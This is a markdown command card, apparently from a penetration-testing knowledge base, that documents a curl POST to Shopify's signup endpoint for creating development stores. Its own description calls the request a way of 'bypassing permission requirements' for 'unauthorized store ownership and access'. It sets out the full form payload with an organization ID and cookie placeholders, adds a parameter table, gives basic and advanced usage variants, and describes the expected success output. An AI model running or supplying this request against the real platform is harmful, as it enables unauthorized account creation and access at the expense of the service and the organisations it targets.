---
id: cmd-post-shopify-create
data: >-
  curl -X POST "https://app.shopify.com/services/signup/create" -H
  "Content-Type: application/x-www-form-urlencoded" -d
  "signup[shop_name]=newiez2&signup[email]=example@gmail.com&signup[password]=5syyyypT&signup[confirm_password]=5syyyypT&signup_source=development+shop&signup[extra][organization_id]=1022333&signup[signup_types][]=affiliate_shop"
tags:
  - shopify
  - api
  - creation
type: command
output: Success response with store creation confirmation and login details
executor: curl
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:30:35.764Z'
verified: false
validated: true
submitted: true
---
# post-shopify-create-dev-store

## Command

```bash
curl -X POST "https://app.shopify.com/services/signup/create" \
  -H "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" \
  -H "Cookie: ..." \
  -d "_y=&ref=&ssid=&source=&source_url=&source_url_referer=&signup_code=&signup_source=development+shop&signup_source_details=test_app_or_theme&signup_page=&signup_page_referer=&signup_locale=&domain_to_connect=&signup%5Bshop_name%5D=newiez2&signup%5Bsubdomain%5D=&signup%5Bfirst_name%5D=&signup%5Blast_name%5D=&signup%5Bemail%5D=example%40gmail.com&signup%5Bpassword%5D=5syyyypT&signup%5Bconfirm_password%5D=5syyyypT&signup%5Baddress1%5D=Suite+10&signup%5Bcity%5D=London&signup%5Bprovince%5D=&signup%5Bzip%5D=Swe10928&signup%5Bcountry%5D=GB&signup%5Bphone%5D=&signup%5Bpos%5D=&signup%5Bextra%5D%5Baffiliate_shop%5D=eyJfcmFpbHMiOnsibWVzc2F&signup%5Bextra%5D%5Borganization_id%5D=1022333&signup%5Bextra%5D%5Bpartner_test_shop%5D=&signup%5Bsignup_types%5D%5B%5D=affiliate_shop&identity_account_experiment="
```

## Description

This command submits form data to create a new development store via Shopify's signup API, bypassing permission requirements and resulting in unauthorized store ownership and access.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| signup[shop_name] | Name of the new store (e.g., newiez2) | Yes |
| signup[email] | Admin email for the store | Yes |
| signup[password] | Password for store admin | Yes |
| signup[extra][organization_id] | Organization ID (e.g., 1022333) | Yes |
| signup_source | Set to 'development+shop' | Yes |
| Cookie | Authenticated session cookies | Yes |

## Examples

### Basic Usage

```bash
curl -X POST "https://app.shopify.com/services/signup/create" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "signup[shop_name]=teststore&signup[email]=test@example.com&signup[password]=pass123&signup[extra][organization_id]=123"
```

### Advanced Usage

```bash
curl -X POST "https://app.shopify.com/services/signup/create" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/86.0" \
  -H "Cookie: ..." \
  -d "[full form data as above]"
```

## Expected Output

HTTP 200/302 response with success indicators, such as redirect to the new store admin (e.g., {"status": "created", "url": "https://newstore.myshopify.com/admin"}) and automatic login.

## Related

- [[commands/get-shopify-dev-store-token]]
- [[procedures/Complete-Development-Store-Creation-via-UI-or-API]]
